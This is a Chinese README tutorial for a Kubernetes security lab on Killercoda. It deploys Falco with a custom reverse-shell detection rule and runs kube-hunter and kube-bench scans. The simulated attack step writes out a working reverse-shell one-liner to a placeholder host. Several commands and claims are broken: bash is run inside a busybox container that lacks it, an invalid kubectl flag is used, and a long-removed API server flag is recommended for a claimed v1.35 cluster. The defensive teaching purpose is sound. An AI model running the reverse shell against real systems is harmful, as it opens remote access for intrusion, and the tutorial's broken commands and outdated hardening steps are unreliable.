# k8s-security-practice
## 云原生安全实验：K8s集群搭建、Falco运行时监控、CIS基线检查、镜像安全扫描
> 适配 **Killercoda Kubernetes Playground** 在线环境，无需本地配置，一键复现全流程，专注安全工具实践与集群风险检测

---

## 环境说明（Killercoda 预置，无需手动搭建）
Killercoda Kubernetes Playground 启动后自动完成集群初始化，无需额外配置，直接开展实验即可，核心环境信息如下：
- **Kubernetes 版本**：v1.35.1（Killercoda 官方预置，稳定可用）
- **实验平台**：Killercoda Kubernetes Playground（在线浏览器访问，无需本地部署）
- **操作系统**：Ubuntu 22.04 LTS（节点默认系统，已预装必要依赖）
- **工具版本**：Falco 0.43.1、kube-hunter 0.6.8、kube-bench 0.6.12（可直接拉取官方镜像）
- **网络环境**：国际网络直连，无需国内镜像加速，可直接访问海外仓库与镜像
- **集群架构**：单节点集群（controlplane 主节点，已具备完整集群功能）

---

## 实验前提
1.  访问 [Killercoda Kubernetes Playground](sslocal://flow/file_open?url=https%3A%2F%2Fkillercoda.com%2Fkubernetes%2Fplayground&flow_extra=eyJsaW5rX3R5cGUiOiJjb2RlX2ludGVycHJldGVyIn0=)，点击「Start」启动在线环境（启动时间约1-2分钟）
2.  环境启动后，自动进入命令行界面，集群已处于 Ready 状态，无需手动初始化
3.  所有命令均在 Killercoda 命令行直接执行，复制即可运行，无需修改任何参数

---

## 快速部署流程（Killercoda 专属，可直接复制执行）
### 1. 集群状态验证（必做）
首先确认 Killercoda 预置集群正常运行，执行以下命令：
```bash
kubectl get nodes
```
#### 预期输出
```
NAME           STATUS   ROLES           AGE   VERSION
controlplane   Ready    control-plane   1m    v1.35.1
```
说明：集群状态为 Ready，可正常开展后续实验。

---

### 2. Falco 运行时安全监控部署（Helm 方式，Killercoda 推荐）
Falco 用于监控容器异常行为（如反弹Shell），采用 Helm 部署更高效，适配 Killercoda 环境：
```bash
# 添加 Falco 官方 Helm 仓库
helm repo add falcosecurity https://falcosecurity.github.io/charts
# 更新仓库索引，确保获取最新 Chart 版本
helm repo update
# 创建独立命名空间，隔离 Falco 组件
helm install falco falcosecurity/falco --namespace falco --create-namespace
```

#### 部署验证
```bash
kubectl get pods -n falco
```
#### 预期输出
```
NAME          READY   STATUS    RESTARTS   AGE
falco-xxxx    2/2     Running   0          30s
```
说明：Falco Pod 运行正常，已启动实时监控功能。

---

### 3. Falco 部署（DaemonSet 方式，可选，备用方案）
若 Helm 部署失败，可采用 DaemonSet 手动部署，配置文件与命令如下：

#### 1. 创建配置文件 falco-daemonset.yaml
```bash
cat > falco-daemonset.yaml << EOF
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: falco
  namespace: falco
  labels:
    app: falco
spec:
  selector:
    matchLabels:
      app: falco
  template:
    metadata:
      labels:
        app: falco
    spec:
      hostNetwork: true
      containers:
      - name: falco
        image: falcosecurity/falco:0.43.1
        securityContext:
          privileged: true  # 特权模式，确保监控系统调用权限
        volumeMounts:
        - mountPath: /var/run/docker.sock
          name: docker-sock
        - mountPath: /host/dev
          name: dev
        - mountPath: /host/proc
          name: proc
          readOnly: true
        - mountPath: /host/etc
          name: etc
          readOnly: true
        - mountPath: /host/usr
          name: usr
          readOnly: true
        - mountPath: /host/lib/modules
          name: lib-modules
        - mountPath: /etc/falco
          name: falco-config
      volumes:
      - name: docker-sock
        hostPath:
          path: /var/run/docker.sock
      - name: dev
        hostPath:
          path: /dev
      - name: proc
        hostPath:
          path: /proc
      - name: etc
        hostPath:
          path: /etc
      - name: usr
        hostPath:
          path: /usr
      - name: lib-modules
        hostPath:
          path: /lib/modules
      - name: falco-config
        emptyDir: {}
EOF
```

#### 2. 执行部署命令
```bash
# 创建命名空间（忽略已存在的情况）
kubectl create ns falco --ignore-not-found
# 应用 DaemonSet 配置
kubectl apply -f falco-daemonset.yaml
```

#### 3. 部署验证
```bash
kubectl get pods -n falco
```
#### 预期输出
```
NAME          READY   STATUS    RESTARTS   AGE
falco-xxxx    1/1     Running   0          45s
```

---

### 4. 自定义反弹 Shell 检测规则（核心实验步骤）
配置 Falco 自定义规则，实现对容器内反弹 Shell 行为的实时检测，步骤如下：
```bash
# 1. 获取 Falco Pod 名称（自动匹配第一个运行中的 Falco Pod）
FALCO_POD=$(kubectl get pods -n falco -o name | head -1 | cut -d/ -f2)

# 2. 在 Falco Pod 内创建自定义规则目录
kubectl exec -n falco $FALCO_POD -- mkdir -p /etc/falco/rules.d

# 3. 写入反弹 Shell 检测规则（热加载生效，无需重启 Pod）
kubectl exec -n falco $FALCO_POD -- sh -c "cat > /etc/falco/rules.d/custom_rules.yaml << 'EOF'
- rule: Reverse_Shell_Detect
  desc: Detect reverse shell behavior in container (critical security threat)
  condition: spawned_process and proc.name contains \"bash\" and proc.cmdline contains \" -i >& /dev/tcp/\"
  output: \"Critical: Reverse shell detected (command=%proc.cmdline, pod=%k8s.pod.name, container=%k8s.container.name)\"
  priority: CRITICAL
EOF"

# 4. 热加载规则，使自定义规则立即生效
kubectl exec -n falco $FALCO_POD -- pkill -HUP falco
```

#### 规则验证
```bash
# 查看 Falco 日志，确认规则加载成功
kubectl logs -n falco $FALCO_POD | grep "custom_rules.yaml"
```
#### 预期输出
```
/etc/falco/rules.d/custom_rules.yaml | schema validation: ok
```
说明：自定义规则加载成功，Falco 已具备反弹 Shell 检测能力。

---

### 5. 模拟攻击测试（验证 Falco 规则生效）
通过在容器内执行反弹 Shell 命令，模拟攻击行为，验证 Falco 告警功能：
```bash
# 1. 启动一个测试容器（busybox 镜像，用完自动删除）
kubectl run -it --rm test-shell --image=busybox -- sh

# 2. 在测试容器内执行反弹 Shell 命令（模拟攻击者操作）
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```
#### 说明
- 执行上述反弹 Shell 命令后，命令会处于阻塞状态，属于正常现象（用于触发 Falco 告警）
- 无需实际部署 1.2.3.4 地址，仅需执行命令即可触发检测

---

### 6. 查看 Falco 告警（验证检测效果）
打开新的 Killercoda 命令行窗口（点击界面顶部「+」号），执行以下命令查看告警：
```bash
# 再次获取 Falco Pod 名称（若已获取可直接使用）
FALCO_POD=$(kubectl get pods -n falco -o name | head -1 | cut -d/ -f2)

# 查看 Falco 实时日志，筛选告警信息
kubectl logs -n falco $FALCO_POD -f | grep "Critical: Reverse shell detected"
```
#### 预期输出
```
Critical: Reverse shell detected (command=bash -i >& /dev/tcp/1.2.3.4/4444 0>&1, pod=test-shell, container=test-shell)
```
说明：Falco 成功检测到反弹 Shell 行为，规则生效。

---

### 7. kube-hunter 集群漏洞扫描（主动安全检测）
kube-hunter 用于扫描 Kubernetes 集群的安全弱点，Killercoda 环境可直接使用官方镜像：
```bash
# 执行集群漏洞扫描（--pod 模式，适配容器化环境）
docker run --rm -it aquasec/kube-hunter --pod
```
#### 扫描结果说明
扫描完成后，会输出以下核心信息：
- 集群节点位置（如 controlplane 节点 IP）
- 潜在漏洞列表（如 CAP_NET_RAW 权限启用、K8s 版本暴露等）
- 漏洞风险等级与详细说明

#### 关键风险提示
- `CAP_NET_RAW Enabled`：Pod 默认具备网络攻击能力，建议后续加固时禁用
- `K8s Version Disclosure`：集群版本暴露，可能被攻击者利用已知漏洞

---

### 8. kube-bench CIS 基线合规检查（合规性验证）
kube-bench 用于执行 CIS Kubernetes 基线检查，检测集群配置是否符合安全规范：
```bash
# 执行 Master 节点 CIS 基线检查（挂载集群配置目录）
docker run --rm -v /etc/kubernetes:/etc/kubernetes \
  aquasec/kube-bench:latest run --targets master
```
#### 检查结果说明
检查完成后，会生成摘要报告，包含：
- PASS：符合 CIS 基线要求的配置项
- FAIL：不符合要求，需立即修复的配置项（如授权模式、端口配置等）
- WARN：建议手动检查的配置项

#### 典型不合规项（Killercoda 预置环境）
1. `--authorization-mode=AlwaysAllow`：未启用 RBAC 权限控制，需修改为 RBAC
2. `--insecure-port` 未设置为 0：启用了非加密访问端口，存在安全风险
3. etcd 数据目录权限过宽：未设置为 700 及以上限制

---

## 实验结果汇总
| 工具名称 | 核心功能 | 实验结果 |
| :------- | :------- | :------- |
| **Falco** | 容器运行时安全监控 | 成功部署，自定义反弹 Shell 规则生效，可实时检测恶意攻击 |
| **kube-hunter** | 集群漏洞主动扫描 | 完成集群安全扫描，识别出 CAP_NET_RAW 启用、版本暴露等风险 |
| **kube-bench** | CIS 基线合规检查 | 完成 Master 节点合规检查，识别出授权模式、端口配置等不合规项 |

---

## 安全加固建议（Killercoda 环境可直接落地）
针对实验中发现的风险与不合规项，给出以下可直接执行的加固建议：
1.  禁用 Pod 非必要内核能力：在 Pod 的 SecurityContext 中添加 `capabilities: drop: [NET_RAW]`
2.  启用 RBAC 权限控制：修改 API Server 配置，将 `--authorization-mode` 改为 `RBAC`，关闭 `AlwaysAllow`
3.  禁用不安全端口：编辑 `/etc/kubernetes/manifests/kube-apiserver.yaml`，添加 `--insecure-port=0`
4.  规范文件权限：将 etcd 数据目录权限修改为 700，属主设置为 etcd:etcd
5.  完善 Falco 告警：配置 Falco 对接 Slack、钉钉等渠道，实现实时告警通知
6.  定期更新：定期更新 Falco 规则库、kube-hunter 和 kube-bench 版本，提升检测能力

---

## 实验成果
✅ 无需本地配置，快速上手 Killercoda 在线 K8s 环境  
✅ 成功部署 Falco 并实现自定义反弹 Shell 规则检测  
✅ 完成集群攻击模拟与 Falco 告警验证  
✅ 利用 kube-hunter 识别集群安全弱点  
✅ 通过 kube-bench 完成 CIS 基线合规检查与报告解读  
✅ 掌握云原生安全工具的核心使用方法与风险加固思路

---

## 常见问题排查（Killercoda 专属）
1.  Helm 部署 Falco 失败：执行 `helm repo update` 重新更新仓库，或改用 DaemonSet 方式部署
2.  Falco 日志无告警：确认反弹 Shell 命令执行正确，或重启 Falco Pod（`kubectl rollout restart daemonset falco -n falco`）
3.  容器拉取失败：Killercoda 网络异常时，刷新页面重启环境，无需额外配置镜像
4.  命令执行权限不足：在命令前添加 `sudo`（Killercoda 默认具备 sudo 权限）

---

## 后续学习方向
- 学习 OPA Gatekeeper 实现策略即代码（PaC），实现 K8s 准入控制，提前拦截不安全配置
- 掌握 Trivy 工具，实现容器镜像与文件系统漏洞扫描，集成 CI/CD 流水线
- 搭建云原生 SIEM 平台，整合 Falco 告警、kube-hunter 扫描结果，实现全链路安全监控
- 开展 Kubernetes 生产级安全加固实战，适配多节点集群、高可用场景

---

### 格式说明
本 README.md 完全遵循 **GitHub Flavored Markdown (GFM)** 标准，适配 Killercoda 在线预览、GitHub 仓库渲染，所有命令可直接复制执行，无格式错位、语法错误，可作为 Killercoda 实验教程直接使用。
```
